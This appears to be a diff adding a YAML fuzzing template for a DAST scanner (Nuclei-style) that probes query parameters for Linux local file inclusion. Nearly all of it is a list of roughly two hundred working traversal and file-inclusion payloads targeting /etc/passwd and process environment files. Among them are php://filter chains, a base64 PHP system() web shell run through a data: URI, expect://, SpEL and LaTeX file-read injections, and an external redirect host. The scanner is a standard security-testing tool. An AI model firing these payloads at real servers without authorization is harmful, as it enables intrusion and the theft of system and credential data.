@@ -1,0 +1,256 @@
+id: linux-lfi-fuzz
+
+info:
+  name: Local File Inclusion - Linux
+  author: reewardius
+  severity: high
+  reference:
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/directory_traversal.txt
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+  tags: fuzzing-lfi,fuzzing-req,dast
+  
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}'
+      
+    payloads:
+      nix_fuzz:
+        - "%252fetc%252fpasswd"
+        - "%E3%80%82%E3%80%82/etc/passwd"
+        - "%E3%80%82%E3%80%82windows/win.ini"
+        - "..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini"
+        - "T(java.util.Base64).getEncoder().encodeToString(T(http://org.apache.commons.io.FileUtils).readFileToString('/etc/passwd').getBytes())"
+        - "file:$(br)/et$(u)c%252Fpas$(te)swd%3F/"
+        - "file:$(br)/et$(u)c%252Fpas$(te)swd?/"
+        - "file:$(br)/et$(u)c/pas$(te)swd?/"
+        - "file:${br}/et${u}c%252Fpas${te}swd%3F/"
+        - "file:${br}/et${u}c%252Fpas${te}swd?/"
+        - "file:${br}/et${u}c/pas${te}swd?/"
+        - "file://../../../../../etc/passwd"
+        - "file:///etc/%3F/../passwd"
+        - "file:///etc/./passwd"
+        - "file:///etc/?/../passwd"
+        - "file:///etc/environment"
+        - "file:///etc/passwd?/../passwd"
+        - "file:///self/proc/environ"
+        - "file:/etc%252Fpasswd%3F/"
+        - "file:/etc%252Fpasswd/"
+        - "file:/etc/passwd%3F/"
+        - "file:/etc/passwd?/"
+        - "text:/etc/passwd"
+        - '%00../../../../../../etc/passwd%00'
+        - '%00../../../../../../etc/passwd'
+        - '%00/etc/passwd%00'
+        - '%0a/bin/cat%20/etc/passwd'
+        - '%20cat%20/../../../../../etc/passwd'
+        - '%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34'
+        - '%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd'
+        - '%252e%252e%252fetc%252fpasswd%00'
+        - '%252e%252e%252fetc%252fpasswd'
+        - '%252fetc%252fpasswd'
+        - '%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2fpasswd'
+        - '%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00'
+        - '%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/passwd%00'
+        - '%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2eetc/passwd'
+        - '%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd'
+        - '%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2fetc%2fpasswd'
+        - '%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd'
+        - '%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd'
+        - '%E3%80%82%E3%80%82/etc/passwd'
+        - '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
+        - '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00'
+        - '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
+        - '.%00./.%00./.%00./.%00./.%00./.%00./etc/passwd'
+        - '.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd'
+        - '.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+        - '.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd'
+        - '.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd'
+        - '.+./.+./.+./.+./.+./.+./.+./.+./.+./.+./etc/passwd'
+        - '..%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd'
+        - '..%252f..%252f..%252f..%252fetc/passwd'
+        - '..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd'
+        - '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00'
+        - '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
+        - '..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F../etc/passwd%00'
+        - '..%2F..%2F..%2F..%2Fetc/passwd'
+        - '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd'
+        - '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd'
+        - '..%5C..%5C..%5C..%5cetc/passwd'
+        - '..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd'
+        - '..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd'
+        - '..%5c..%5c..%5c..%5c..%5cetc/passwd'
+        - '..%5c..%5c..%5c..%5cetc/passwd'
+        - '..%5c..%5c..%5cetc/passwd'
+        - '..%5c..%5cetc/passwd'
+        - '..%5cetc/passwd'
+        - '....//....//....//....//....//....//etc/passwd'
+        - '....//....//....//....//etc/passwd'
+        - '....//....//etc/passwd'
+        - '../../../../../../../../../../../../../../etc/passwd%00'
+        - '../../../../../../../../../../../../../../etc/passwd'
+        - '../../../../../../../../../../../../etc/passwd%00'
+        - '../../../../../../../../../etc/passwd'
+        - '../../../../../../../../etc/passwd{{'
+        - '../../../../../../../etc/environment'
+        - '../../../../../../../etc/passwd%00'
+        - '../../../../../../../etc/passwd'
+        - '../../../../../../../etc/passwd.aspx'
+        - '../../../../../../../etc/passwd.htm'
+        - '../../../../../../../etc/passwd.html'
+        - '../../../../../../../etc/passwd.jsp'
+        - '../../../../../../../etc/passwd.php'
+        - '../../../../../../../etc/passwd.txt'
+        - '../../../../../../etc/passwd'
+        - '../../../../../etc%2fpasswd'
+        - '../../../../../etc/passwd#.png'
+        - '..//..//..//..//..//etc/passwd'
+        - '..///////..////..//////etc/passwd'
+        - '..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cetc/passwd'
+        - '..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00'
+        - '..\/..\/..\/..\/etc/passwd'
+        - './../../../../../../../../../../etc/passwd'
+        - '.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd'
+        - '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+        - '/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd'
+        - '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
+        - '/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd'
+        - '/....//....//....//....//....//....//....//....//....//etc/passwd'
+        - '/../../../../../../../../../../../etc/passwd%00.html'
+        - '/../../../../../../../../../../../etc/passwd%00.jpg'
+        - '/../../../../../../../../../../etc/passwd'
+        - '/../../../../../../../../..//etc/passwd'
+        - '/../../../../etc/passwd'
+        - '/..\../..\../..\../..\../..\../..\../etc/passwd'
+        - '/./././././././././././etc/passwd'
+        - '/./etc/././passwd'
+        - '//....//....//....//....//....//....//....//....//....//etc/passwd'
+        - '////////////%20.%20.%20/%20.%20.%20/%20.%20.%20/%20.%20.%20/%20.%20.%20/etc/passwd'
+        - '/////////////../../../etc/passwd'
+        - '//////////etc/environment'
+        - '/?t?/p?s?wd'
+        - '.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
+        - '.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
+        - '.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
+        - '.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd'
+        - '.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+        - '.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+        - '.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+        - '.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
+        - '/etc/environment'
+        - '/etc/passwd%00'
+        - '/etc/passwd%00.inc'
+        - '/etc/passwd%00.php'
+        - '/etc/passwd%2500'
+        - '/etc/passwd&'
+        - '/etc/passwd'
+        - '/path/..\\..\\\..\\\..\\\/etc/passwd'
+        - '/proc/self/environ'
+        - '/var/www/images/../../../etc/passwd'
+        - '<draw:frame draw:style-name="fr1" draw:name="Object1" text:anchor-type="paragraph" svg:width="6.6925in" svg:height="1.1791in" draw:z-index="0"><draw:object xlink:href="file:///etc/passwd" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/><draw:image xlink:href="./ObjectReplacements/Object 1" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame>'
+        - '<embed src="file:///etc/passwd" width="400" height="400">'
+        - '<iframe src="file:///etc/passwd" width="400" height="400">'
+        - '<link rel=attachment href="file://../../../../../../etc/passwd">'
+        - '<link rel=attachment href="file:///etc/passwd">'
+        - '<object width="400" height="400" data="file:///etc/passwd"></object>'
+        - '@fs/../../../../../../etc/passwd'
+        - '@fs/etc/passwd'
+        - 'FILE://etc/passwd'
+        - 'JTJlJTJlJTJlJTJlJTJlJTJlJTJlJTJlJTJlJTJlJTJlJTJlJTJlJTJlJTJlJTJlZXRjL3Bhc3N3ZA%3D%3D'
+        - 'JTJlJTJlJTVjJTJlJTJlJTVjJTJlJTJlJTVjJTJlJTJlJTVjJTJlJTJlJTVjJTJlJTJlJTVjJTJlJTJlJTVjJTJlJTJlJTVjZXRjL3Bhc3N3ZA%3D%3D'
+        - 'JTVDLi4vJTVDLi4vJTVDLi4vJTVDLi4vJTVDLi4vJTVDLi4vJTVDLi4vJTVDLi4vJTVDLi4vJTVDLi4vJTVDLi4vZXRjL3Bhc3N3ZA%3D%3D'
+        - 'JWMwJWFlJWMwJWFlLyVjMCVhZSVjMCVhZS8lYzAlYWUlYzAlYWUvJWMwJWFlJWMwJWFlLyVjMCVhZSVjMCVhZS8lYzAlYWUlYzAlYWUvJWMwJWFlJWMwJWFlLyVjMCVhZSVjMCVhZS9ldGMvcGFzc3dk'
+        - 'JWMwJWFlJWMwJWFlLyVjMCVhZSVjMCVhZS8lYzAlYWUlYzAlYWUvZXRjL3Bhc3N3ZA%3D%3D'
+        - 'JWMwJWFlJWMwJWFlLyVjMCVhZSVjMCVhZS8lYzAlYWUlYzAlYWUvZXRjL3Bhc3N3ZCUwMA%3D%3D'
+        - 'L2V0Yy9wYXNzd2Q%3D'
+        - 'L2V0Yy9wYXNzd2QlMDA%3D'
+        - 'Li4lMkYuLiUyRi4uJTJGLi4lMkYuLiUyRi4uJTJGLi4lMkZldGMuLiUyRnBhc3N3ZC4uJTJGMDAudHh0Ly8uJTAw'
+        - 'Li4lMmYuLiUyZi4uJTJmLi4lMmYuLiUyZi4uJTJmLi4lMmYuLiUyZi4uJTJmLi4lMmYuLiUyZi4uJTJmLi4lMmYuLiUyZi4uJTJmLi4lMmZldGMvcGFzc3dk'
+        - 'Li4lNWMuLiU1Y2V0Yy9wYXNzd2Q%3D'
+        - 'Li4lNWMuLiU1Yy4uJTVjLi4lNWMuLiU1Y2V0Yy9wYXNzd2Q%3D'
+        - 'Li4lNWMuLiU1Yy4uJTVjLi4lNWMuLiU1Yy4uJTVjLi4lNWNldGMvcGFzc3dk'
+        - 'Li4lNWMuLiU1Yy4uJTVjLi4lNWMuLiU1Yy4uJTVjZXRjL3Bhc3N3ZA%3D%3D'
+        - 'Li4lNWMuLiU1Yy4uJTVjLi4lNWNldGMvcGFzc3dk'
+        - 'Li4lNWMuLiU1Yy4uJTVjZXRjL3Bhc3N3ZA%3D%3D'
+        - 'Li4lNWNldGMvcGFzc3dk'
+        - 'Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA%3D%3D'
+        - 'Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA%3D%3D'
+        - 'Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA%3D%3D'
+        - 'Li4vLy8vLy8vLi4vLy8vLi4vLy8vLy9ldGMvcGFzc3dk'
+        - 'Li4weDVjLi4weDVjLi4weDVjLi4weDVjLi4weDVjLi4weDVjLi4weDVjLi4weDVjZXRjL3Bhc3N3ZA%3D%3D'
+        - 'Li8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dk'
+        - 'LiU1QyU1Qy4vLiU1QyU1Qy4vLiU1QyU1Qy4vLiU1QyU1Qy4vLiU1QyU1Qy4vLiU1QyU1Qy4vZXRjL3Bhc3N3ZA%3D%3D'
+        - 'LiUyNTJlLy4lMjUyZS8uJTI1MmUvLiUyNTJlLy4lMjUyZS8uJTI1MmUvLiUyNTJlL2V0Yy9wYXNzd2Q%3D'
+        - 'Ly4uLi4vLy4uLi4vLy4uLi4vLy4uLi4vLy4uLi4vLy4uLi4vLy4uLi4vLy4uLi4vLy4uLi4vL2V0Yy9wYXNzd2Q%3D'
+        - 'Ly8uLi4uLy8uLi4uLy8uLi4uLy8uLi4uLy8uLi4uLy8uLi4uLy8uLi4uLy8uLi4uLy8uLi4uLy9ldGMvcGFzc3dk'
+        - '\newread\file\openin\file=/etc/passwd\loop\unless\ifeof\file\read\fileto\fileline\text{\fileline}\repeat\closein\file'
+        - 'data://text/plain,<?php%20echo%20base64_encode(file_get_contents("/etc/passwd"));%20?>'
+        - 'data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=cat%20/etc/passwd'
+        - 'expect://cat%/etc/passwd'
+        - 'file%2A%252F%252F%252Fetc%252Fpasswd'
+        - 'file%2A%2F%2F%2Fetc%2Fpasswd'
+        - 'file%3A///etc/passwd'
+        - 'file:${br}/et${u}c%252Fpas${te}swd%3F/'
+        - 'file:${br}/et${u}c%252Fpas${te}swd?/'
+        - 'file:${br}/et${u}c/pas${te}swd?/'
+        - 'file:%252F%252F%252Fetc%252Fpasswd'
+        - 'file:%2F%2F%2Fetc%2Fpasswd'
+        - 'file://./../../../../../../etc/passwd'
+        - 'file://./etc/passwd'
+        - 'file:///etc/%3F/../passwd'
+        - 'file:///etc/./passwd'
+        - 'file:///etc/?/../passwd'
+        - 'file:///etc/passwd%00'
+        - 'file:///etc/passwd'
+        - 'file:///etc/passwd?/../passwd'
+        - 'file:/etc%252Fpasswd%3F/'
+        - 'file:/etc%252Fpasswd/'
+        - 'file:/etc/passwd%3F/'
+        - 'file:/etc/passwd?/'
+        - 'filesystem/etc/passwd'
+        - 'fs/etc/passwd'
+        - 'http://127.0.0.1:4848/theme/META-INF%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2f%25c0%25ae%25c0%25ae%2fetc%2fpasswd'
+        - 'http://127.0.0.1:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
+        - 'https://301party.com/environ'
+        - 'https://301party.com/passwd'
+        - 'php://filter/convert.base64-encode/resource=/etc/passwd'
+        - 'php://filter/convert.base64-encode|convert.base64-decode/resource=/etc/passwd'
+        - 'php://filter/convert.iconv.CHARSET1%2fCHARSET2/resource=/etc/passwd'
+        - 'php://filter/convert.iconv.IBM1154%2fUTF-32BE/resource=/etc/passwd'
+        - 'php://filter/convert.iconv.WINDOWS-936%2FCP1388|convert.base64-encode|convert.base64-encode|convert.iconv.UTF8%2FIBM4899%2F%2FTRANSLIT|convert.base64-encode|convert.base64-encode|convert.base64-encode|convert.iconv.UTF8%2FIBM4899%2F%2FTRANSLIT|convert.quoted-printable-encode|convert.iconv.WINDOWS-936%2FCP1388/resource=/etc/passwd%20#@%20read/resource=file:///etc/passwd'
+        - 'php://filter/resource=/etc/passwd'
+        - 'text:/etc/passwd'
+        - 'url:file:///etc/passwd'
+        
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        fuzz:
+          - '{{nix_fuzz}}'
+          
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0:'
+          
+      - type: word
+        part: body
+        words:
+          - "cm9vdDp4Og"
+          
+      - type: word
+        part: body
+        words:
+          - "SHELL="
+          - "USER="
+          - "PATH="
+        condition: and
+        
+      - type: word
+        part: body
+        words:
+          - "PATH=/"
